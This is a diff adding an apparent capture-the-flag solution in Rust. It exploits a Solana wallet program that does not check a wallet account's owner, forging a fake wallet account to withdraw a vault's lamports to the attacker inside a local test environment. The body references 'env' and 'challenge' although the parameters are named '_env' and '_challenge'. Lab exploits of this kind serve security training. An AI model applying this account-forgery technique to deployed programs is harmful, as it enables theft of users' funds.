@@ -1,3 +1,5 @@
+// FOUND
+
 use std::{env, str::FromStr};
 
 use owo_colors::OwoColorize;
@@ -19,14 +21,43 @@ struct Challenge {
     wallet_authority: Pubkey,
 }
 
-// Do your hacks in this function here
+// Do your hacks in this function here; this hacks wallet owner not checked aginst program_id
 fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
 
     // Step 0: how much money do we want to steal?
+    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
+    println!("Trying to steal {} lamports", amount.green());
 
     // Step 1: a fake wallet with the same vault
+    let hack_wallet = Wallet {
+        authority: challenge.hacker.pubkey(),
+        vault: challenge.vault_address,
+    };
+
+    let fake_wallet = keypair(123);
+    let mut hack_wallet_data: Vec<u8> = vec![];
+
+    hack_wallet.serialize(&mut hack_wallet_data).unwrap();
+
+    env.create_account_with_data(&fake_wallet, hack_wallet_data);
 
     // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
+
+    env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(fake_wallet.pubkey(), false),
+                AccountMeta::new(challenge.vault_address, false),
+                AccountMeta::new(challenge.hacker.pubkey(), true),
+                AccountMeta::new(challenge.hacker.pubkey(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+        }],
+        &[&challenge.hacker],
+    )
+    .print();
 }
 
 /*
